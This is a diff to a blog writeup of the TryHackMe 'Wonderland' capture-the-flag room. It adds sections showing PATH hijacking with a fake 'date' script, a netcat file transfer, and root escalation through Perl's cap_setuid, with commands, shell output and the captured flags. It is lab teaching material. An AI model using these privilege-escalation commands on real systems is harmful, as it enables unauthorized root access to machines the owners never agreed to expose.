@@ -13,7 +13,7 @@ permalink: /tryhackme/wonderland-writeup
 
 This is a writeup of the Alice In Wonderland-themed TryHackMe capture the flag challenge, [Wonderland](https://tryhackme.com/room/wonderland). This challenge has been rated medium difficulty. There are two flags to find - we know that there is a flag in a file called ```user.txt```, and a root flag in ```root.txt```.
 
-### Enumeration
+### Initial Reconnaissance
  We start with an nmap scan, to see which ports are open and what services are running. We scan for service versions, operating systems, and utilise common scripts.
 
 ##### Command:
@@ -217,7 +217,11 @@ User alice may run the following commands on wonderland:
 	(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 ```
 
-Alice can run python, and the poem script, as the ```rabbit``` user! However, the current user ```alice``` does not have permissions to write to the file. Nevertheless, we can still exploit this misconfiguration. Notice that the python script imports the ```random``` module. We locate this file, then check its permissions.
+Alice can run python, and the poem script, as the ```rabbit``` user! However, the current user ```alice``` does not have permissions to write to the file. Nevertheless, we can still exploit this misconfiguration.
+
+### Lateral Movement - Python Library Hijacking
+
+Notice that the python script imports the ```random``` module. We locate this file, then check its permissions.
 
 ##### Commands:
 > locate random.py
@@ -281,6 +285,8 @@ $ python3.6 -c 'import pty; pty.spawn("/bin/bash")'
 rabbit@wonderland:~$
 ```
 
+### Lateral Movement - PATH Hijacking
+
 We now have a snoop around ```rabbit```’s home directory.
 
 ```
@@ -330,4 +336,128 @@ Probably by Fri, 16 Dec 2022 03:20:31 +0000
 Ask very nicely, and I will give you some tea while you wait for him
 ```
 
-It appears we have to wait an hour from the current time (yes, I am doing this CTF at 02:20…)
+It appears we have to wait an hour from the current time (yes, I am doing this CTF at 02:20…). Some further investigation is required. Netcat is used to transfer this executable onto my local machine.
+
+##### Command on local machine:
+> nc -lnvp 54321 > teaParty
+
+##### Command on SSH machine:
+> nc [local ip] 54321 < teaParty
+
+The file is now on my local machine. As before, ```strings``` is used to find strings in the compiled executable.
+
+##### Command:
+> strings teaParty
+
+```
+─$ strings teaParty
+130 ⨯
+/lib64/ld-linux-x86-64.so.2
+(...)
+_u/UH
+[]A\A]A^A_
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+/bin/echo -n 'Probably by ' && date --date='next hour' -R
+Ask very nicely, and I will give you some tea while you wait for him
+(...)
+```
+
+We see the command used to get the system time - the ```date``` command. Using a similar technique to the Python Library Hijack attack, we create a new file called ```date```, containing a shell script. Usually, ```date``` is stored in ```/bin/date```. We will put our malicious ```date``` executable in the directory above ```/bin```, so it executes instead of the true ```date```. To accomplish this, we will put the malicious ```date``` in the ```/tmp``` directory, before adding ```/tmp``` to the ```PATH``` variable.
+
+##### Commands:
+> cd /tmp
+nano date
+chmod +x date
+
+We have also ensured that the new ```date``` file can be executed. The new ```date``` file now contains the following:
+
+```
+#!/bin/bash
+
+/bin/bash
+```
+
+We now edit the ```PATH``` variable.
+
+##### Command:
+> export PATH=/tmp:$PATH
+
+The ```PATH``` variable will now start with ```/tmp```. This means that ```/tmp``` will be the first place the kernel searches when fetching binaries to execute. Since our malicious ```date``` file is located in ```/tmp```, this will be executed instead of the correct ```date```, located in ```/bin```.  Once this is done, ```teaParty``` is executed.
+
+```
+rabbit@wonderland:/home/rabbit$ ./teaParty
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by hatter@wonderland:/home/rabbit$ whoami
+hatter
+hatter@wonderland:/home/rabbit$
+```
+
+This has worked! We are now the ```hatter``` user.
+
+### Privilege Escalation - Capabilities on Perl
+
+We will now investigate ```hatter```’s home directory.
+
+```
+hatter@wonderland:/home/rabbit$ cd ../hatter
+hatter@wonderland:/home/hatter$ ls
+password.txt
+hatter@wonderland:/home/hatter$ cat password.txt
+WhyIsARavenLikeAWritingDesk?
+```
+
+It appears that we have found a password. When we use the command ```su hatter``` and enter this password, it is accepted. We can therefore conclude that this is the password of the ```hatter``` user. I tried to find out what ```hatter``` can run with ```sudo```, but the output was ```Sorry, user hatter may not run sudo on wonderland.```.
+
+To escalate our privileges further, we search for [capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities). Capabilities break up root privileges into smaller chunks, so that smaller subsets of processes can be accessed. This ensures users only get the privileges they truly need, and the risk of exploitation is reduced. But this risk is never zero…
+
+For more on exploiting capabilities for privilege escalation, [this article](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) gives an in-depth guide.
+
+We search for capabilities available to the ```hatter``` user.
+
+##### Command:
+> getcap -r / 2>/dev/null
+
+```
+hatter@wonderland:~$ getcap -r / 2>/dev/null
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+```
+
+It appears that the ```hatter``` user has the capability ```cap_setuid``` on Perl. From the Linux Manual page:
+>##### CAP_SETUID
+    * Make arbitrary manipulations of process UIDs ;
+    * forge UID when passing socket credentials via UNIX domain sockets;
+    * write a user ID mapping in a user namespace;
+
+From [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities), we can manipulate the UID of the perl binary itself gain privileged access.
+
+##### Command:
+>perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+
+```
+hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/
+# whoami
+root
+# python3.6 -c 'import pty; pty.spawn("/bin/bash")'
+root@wonderland:~#
+```
+
+And now we are root! Again, the command ```python3.6 -c 'import pty; pty.spawn("/bin/bash")' ``` is used to gain a more stable shell. We can now read the root flag ```/home/alice/root.txt```. We also find the ```user.txt``` flag hidden in the root directory. Pretty mischievous that the ‘easier’ flag still required root access!
+
+```
+root@wonderland:/home/alice# cat root.txt
+thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
+root@wonderland:/home/alice# cd /root
+root@wonderland:/root# ls
+user.txt
+root@wonderland:/root# cat user.txt
+thm{"Curiouser and curiouser!"}
+```
+We now have both flags, and the challenge is complete.
+
+### Conclusion
+
+Throughout this CTF challenge, many penetration testing techniques were explored, especially around lateral movement and pivoting through a system. We started with some iniital reconnaissance
